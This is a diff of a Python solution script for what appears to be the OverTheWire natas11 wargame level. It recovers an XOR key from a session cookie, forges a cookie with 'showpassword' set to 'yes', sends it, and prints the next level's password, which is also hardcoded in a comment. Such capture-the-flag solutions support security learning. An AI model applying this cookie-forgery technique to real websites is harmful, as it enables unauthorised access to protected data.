@@ -25,6 +25,7 @@ source = html.unescape(response.text).replace('<br />', '')
 body = bs4.BeautifulSoup(source, 'lxml').body
 print(f'{body.prettify()}\n')
 
+
 # the source code has a default data, which is a PHP array that contains
 # showpassword key with value no
 # and bgcolor key with value #ffffff
@@ -93,11 +94,13 @@ def xor(plaintext1, plaintext2):
 
 key = xor(data_cookie, bytearray(default, 'utf-8'))[:4]
 # the key is qw8J
-print(key)
+print(f'{key}\n')
+
+
 # finally, we create the data that we want, json encode it, xor encrypt with the recovered key and finally, base64 encode it
 data = {
     'showpassword' : 'yes',
-    'bgcolor' : '#ffffff'
+    'bgcolor' : '#fffffa'
 }
 data = json.dumps(data)
 # repeat the key len(data) // len(key) times
@@ -105,5 +108,15 @@ data = json.dumps(data)
 key1 = key * (len(data)//len(key)) + key[:len(data) % len(key)]
 data = xor(bytearray(data, 'utf-8'), bytearray(key1, 'utf-8'))
 data = base64.b64encode(bytearray(data, 'utf-8'))
+data = requests.utils.quote(data)
 # and send it as a cookie 'data' to the server
+requests.utils.add_dict_to_cookiejar(session.cookies, {'data' : data})
+response = session.get(URL)
+body = bs4.BeautifulSoup(response.text, 'html.parser').body
+print(f'{body}\n')
 # this should allow us to get the password of the next level
+
+
+# natas12 password: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+password = re.search(r'is (\w+)', str(body)).group(1)
+print(f'natas12 password: {password}')
